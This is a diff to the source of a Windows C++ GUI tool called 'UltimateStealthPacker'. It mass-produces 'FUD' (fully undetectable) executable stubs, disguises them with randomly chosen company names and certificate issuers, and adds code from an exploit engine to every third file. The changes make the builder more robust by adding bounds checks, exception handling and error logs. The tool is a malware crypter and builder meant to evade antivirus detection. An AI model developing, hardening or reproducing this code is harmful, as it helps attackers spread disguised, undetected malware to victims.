@@ -1,4 +1,3 @@
-﻿
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
 #endif
@@ -16,6 +15,8 @@
 #include <shlobj.h>
 #include <tlhelp32.h>
 #include <tchar.h>
+#include <winreg.h>
+#include <shlwapi.h>
 
 #include <iostream>
 #include <fstream>
@@ -34,6 +35,7 @@
 #include <ctime>
 #include <cstring>
 #include <cstdint>
+#include <filesystem>
 #include "tiny_loader.h"
 #include "cross_platform_encryption.h"
 #include "enhanced_loader_utils.h"
@@ -46,6 +48,7 @@
 #pragma comment(lib, "comctl32.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "shlwapi.lib")
 
 // GUI Control IDs
 constexpr int ID_INPUT_PATH = 1001;
@@ -1497,16 +1500,32 @@ public:
                     exe[off + 2] = (v >> 16) & 0xFF;
                     exe[off + 3] = (v >> 24) & 0xFF;
                 }
-                };
+            };
 
-            poke32(PAYLOAD_SIZE_OFFSET, static_cast<uint32_t>(payload.size() & 0xFFFFFFFF));    // size
-            poke32(PAYLOAD_RVA_OFFSET, static_cast<uint32_t>(payloadOffset & 0xFFFFFFFF));     // RVA (=file offset here)
+            // Ensure offsets are within bounds
+            if (PAYLOAD_SIZE_OFFSET + 3 < exe.size() && PAYLOAD_RVA_OFFSET + 3 < exe.size()) {
+                poke32(PAYLOAD_SIZE_OFFSET, static_cast<uint32_t>(payload.size() & 0xFFFFFFFF));    // size
+                poke32(PAYLOAD_RVA_OFFSET, static_cast<uint32_t>(payloadOffset & 0xFFFFFFFF));     // RVA (=file offset here)
+            } else {
+                // If offsets are invalid, return empty vector
+                return {};
+            }
 
             return exe;   // finished PE bytes - REAL WORKING EXECUTABLE!
 
         }
+        catch (const std::exception& e) {
+            // Log error for debugging
+            std::ofstream errorLog("pe_generation_error.txt", std::ios::app);
+            errorLog << "PE Generation Error: " << e.what() << std::endl;
+            errorLog.close();
+            return {};
+        }
         catch (...) {
             // Fallback to external compiler if anything goes wrong
+            std::ofstream errorLog("pe_generation_error.txt", std::ios::app);
+            errorLog << "PE Generation Error: Unknown exception" << std::endl;
+            errorLog.close();
             return {};
         }
     }
@@ -2535,97 +2554,139 @@ public:
 
 
 // Global variables
-HWND g_hInputPath, g_hOutputPath, g_hProgressBar, g_hStatusText, g_hCompanyCombo, g_hArchCombo, g_hCertCombo;
-HWND g_hMassCountEdit, g_hMassGenerateBtn, g_hStopGenerationBtn, g_hCreateButton;
-HWND g_hModeGroup, g_hModeStubRadio, g_hModePackRadio, g_hModeMassRadio;
-HWND g_hExploitCombo;
+HWND g_hInputPath = NULL, g_hOutputPath = NULL, g_hProgressBar = NULL, g_hStatusText = NULL, g_hCompanyCombo = NULL, g_hArchCombo = NULL, g_hCertCombo = NULL;
+HWND g_hMassCountEdit = NULL, g_hMassGenerateBtn = NULL, g_hStopGenerationBtn = NULL, g_hCreateButton = NULL;
+HWND g_hModeGroup = NULL, g_hModeStubRadio = NULL, g_hModePackRadio = NULL, g_hModeMassRadio = NULL;
+HWND g_hExploitCombo = NULL;
 UltimateStealthPacker g_packer;
 
 // Mass generation function using internal PE generator
 static DWORD WINAPI massGenerationThread(LPVOID lpParam) {
     int totalCount = *(int*)lpParam;
+    int successCount = 0;
 
-    for (int i = 0; i < totalCount && g_massGenerationActive; ++i) {
-        // Use GUI selections as base, but randomize company/cert for variety
-        int baseArchIndex = (int)SendMessage(g_hArchCombo, CB_GETCURSEL, 0, 0);
-        if (baseArchIndex == CB_ERR) baseArchIndex = 0; // Default to x64
+    try {
+        for (int i = 0; i < totalCount && g_massGenerationActive; ++i) {
+            // Use GUI selections as base, but randomize company/cert for variety
+            int baseArchIndex = (int)SendMessage(g_hArchCombo, CB_GETCURSEL, 0, 0);
+            if (baseArchIndex == CB_ERR) baseArchIndex = 0; // Default to x64
 
-        int companyIndex = g_packer.randomEngine.generateRandomDWORD() % g_packer.getCompanyProfiles().size();
-        int certIndex = g_packer.getSafeRandomCertIndex(companyIndex); // Use safe certificate selection
-        int archIndex = baseArchIndex; // Use architecture from GUI
+            // Ensure we have valid company profiles
+            auto companyProfiles = g_packer.getCompanyProfiles();
+            if (companyProfiles.empty()) {
+                SetWindowTextW(g_hStatusText, L"Error: No company profiles available!");
+                break;
+            }
 
-        auto architectures = g_packer.getArchitectures();
-        MultiArchitectureSupport::Architecture architecture = architectures[archIndex].first;
+            int companyIndex = g_packer.randomEngine.generateRandomDWORD() % companyProfiles.size();
+            int certIndex = g_packer.getSafeRandomCertIndex(companyIndex); // Use safe certificate selection
+            int archIndex = baseArchIndex; // Use architecture from GUI
 
-        // Generate unique output filename
-        std::string outputPath = "FUD_Stub_" + std::to_string(i + 1) + "_" +
-            g_packer.randomEngine.generateRandomName(8) + ".exe";
+            auto architectures = g_packer.getArchitectures();
+            if (architectures.empty() || archIndex >= architectures.size()) {
+                archIndex = 0; // Default to first architecture
+            }
+            MultiArchitectureSupport::Architecture architecture = architectures[archIndex].first;
 
-        // Update status
-        std::wstring statusText = L"Generating FUD stub " + std::to_wstring(i + 1) +
-            L" of " + std::to_wstring(totalCount) + L"...";
-        SetWindowTextW(g_hStatusText, statusText.c_str());
+            // Generate unique output filename
+            std::string outputPath = "FUD_Stub_" + std::to_string(i + 1) + "_" +
+                g_packer.randomEngine.generateRandomName(8) + ".exe";
 
-        // Update progress
-        int progress = (i * 100) / totalCount;
-        SendMessage(g_hProgressBar, PBM_SETPOS, progress, 0);
+            // Update status
+            std::wstring statusText = L"Generating FUD stub " + std::to_wstring(i + 1) +
+                L" of " + std::to_wstring(totalCount) + L"...";
+            SetWindowTextW(g_hStatusText, statusText.c_str());
 
-        // Generate FUD combo
-        auto fudCombo = g_packer.getRandomFUDCombination();
-        int safeCompanyIndex = g_packer.findCompanyIndex(fudCombo.companyName);
-        int safeCertIndex = g_packer.findCertificateIndex(fudCombo.certIssuer);
+            // Update progress
+            int progress = (i * 100) / totalCount;
+            SendMessage(g_hProgressBar, PBM_SETPOS, progress, 0);
 
-        // Get current exploit selection from dropdown (or randomize for variety)
-        int exploitIndex = (int)SendMessage(g_hExploitCombo, CB_GETCURSEL, 0, 0);
-        ExploitDeliveryType exploitType = (ExploitDeliveryType)exploitIndex;
+            // Generate FUD combo
+            auto fudCombo = g_packer.getRandomFUDCombination();
+            int safeCompanyIndex = g_packer.findCompanyIndex(fudCombo.companyName);
+            int safeCertIndex = g_packer.findCertificateIndex(fudCombo.certIssuer);
 
-        // For mass generation, optionally randomize exploits for variety
-        if (i % 3 == 0) { // Every 3rd file uses a random exploit
-            exploitType = (ExploitDeliveryType)(g_packer.randomEngine.generateRandomDWORD() % 6);
+            // Ensure valid indices
+            if (safeCompanyIndex < 0) safeCompanyIndex = 0;
+            if (safeCertIndex < 0) safeCertIndex = 0;
+
+            // Get current exploit selection from dropdown (or randomize for variety)
+            int exploitIndex = (int)SendMessage(g_hExploitCombo, CB_GETCURSEL, 0, 0);
+            if (exploitIndex == CB_ERR) exploitIndex = 0;
+            ExploitDeliveryType exploitType = (ExploitDeliveryType)exploitIndex;
+
+            // For mass generation, optionally randomize exploits for variety
+            if (i % 3 == 0) { // Every 3rd file uses a random exploit
+                exploitType = (ExploitDeliveryType)(g_packer.randomEngine.generateRandomDWORD() % 6);
+            }
+
+            // Generate benign code for the stub
+            std::string companyName = companyProfiles[safeCompanyIndex].name;
+            std::string benignCode = g_packer.benignBehavior.generateBenignCode(companyName);
+
+            // Add exploit code if selected
+            if (exploitType != EXPLOIT_NONE) {
+                std::vector<uint8_t> dummyPayload = { 0x4D, 0x5A }; // Just MZ header for exploit generation
+                std::string exploitCode = g_packer.exploitEngine.generateExploit(exploitType, dummyPayload);
+                benignCode += "\n\n" + exploitCode;
+            }
+
+            // Use internal PE generator with tiny_loader.h
+            std::vector<uint8_t> executableData = g_packer.embeddedCompiler.generateMinimalPEExecutable(benignCode);
+
+            if (executableData.empty()) {
+                // Log error but continue with next file
+                std::ofstream errorLog("mass_generation_errors.txt", std::ios::app);
+                errorLog << "Failed to generate PE for file " << outputPath << std::endl;
+                errorLog.close();
+                continue;
+            }
+
+            // Write the executable to file
+            std::ofstream outFile(outputPath, std::ios::binary);
+            if (!outFile.is_open()) {
+                // Log error but continue with next file
+                std::ofstream errorLog("mass_generation_errors.txt", std::ios::app);
+                errorLog << "Failed to write file " << outputPath << std::endl;
+                errorLog.close();
+                continue;
+            }
+
+            outFile.write(reinterpret_cast<const char*>(executableData.data()), executableData.size());
+            outFile.close();
+
+            successCount++;
+
+            // Small delay to prevent system overload
+            Sleep(100);
         }
 
-        // Generate benign code for the stub
-        std::string companyName = g_packer.getCompanyProfiles()[safeCompanyIndex].name;
-        std::string benignCode = g_packer.benignBehavior.generateBenignCode(companyName);
+        // Generation complete
+        SendMessage(g_hProgressBar, PBM_SETPOS, 100, 0);
+        std::wstring finalStatus = L"Mass generation completed! " + std::to_wstring(successCount) + 
+            L" of " + std::to_wstring(totalCount) + L" FUD stubs created successfully.";
+        SetWindowTextW(g_hStatusText, finalStatus.c_str());
 
-        // Add exploit code if selected
-        if (exploitType != EXPLOIT_NONE) {
-            std::vector<uint8_t> dummyPayload = { 0x4D, 0x5A }; // Just MZ header for exploit generation
-            std::string exploitCode = g_packer.exploitEngine.generateExploit(exploitType, dummyPayload);
-            benignCode += "\n\n" + exploitCode;
-        }
-
-        // Use internal PE generator with tiny_loader.h
-        std::vector<uint8_t> executableData = g_packer.embeddedCompiler.generateMinimalPEExecutable(benignCode);
-
-        if (executableData.empty()) {
-            SetWindowTextW(g_hStatusText, L"Generation failed! Internal PE generator error.");
-            break;
-        }
-
-        // Write the executable to file
-        std::ofstream outFile(outputPath, std::ios::binary);
-        if (!outFile.is_open()) {
-            SetWindowTextW(g_hStatusText, L"Generation failed! Cannot write output file.");
-            break;
-        }
-
-        outFile.write(reinterpret_cast<const char*>(executableData.data()), executableData.size());
-        outFile.close();
-
-        // Small delay to prevent system overload
-        Sleep(100);
     }
-
-    // Generation complete
-    SendMessage(g_hProgressBar, PBM_SETPOS, 100, 0);
-    SetWindowTextW(g_hStatusText, L"Mass generation completed! All FUD stubs created using internal PE generator.");
+    catch (const std::exception& e) {
+        std::ofstream errorLog("mass_generation_errors.txt", std::ios::app);
+        errorLog << "Mass generation exception: " << e.what() << std::endl;
+        errorLog.close();
+        SetWindowTextW(g_hStatusText, L"Mass generation failed with exception!");
+    }
+    catch (...) {
+        std::ofstream errorLog("mass_generation_errors.txt", std::ios::app);
+        errorLog << "Mass generation unknown exception" << std::endl;
+        errorLog.close();
+        SetWindowTextW(g_hStatusText, L"Mass generation failed with unknown error!");
+    }
 
     // Re-enable buttons
     EnableWindow(g_hMassGenerateBtn, TRUE);
     EnableWindow(g_hStopGenerationBtn, FALSE);
 
     g_massGenerationActive = false;
+    return 0;
     return 0;
 }
 
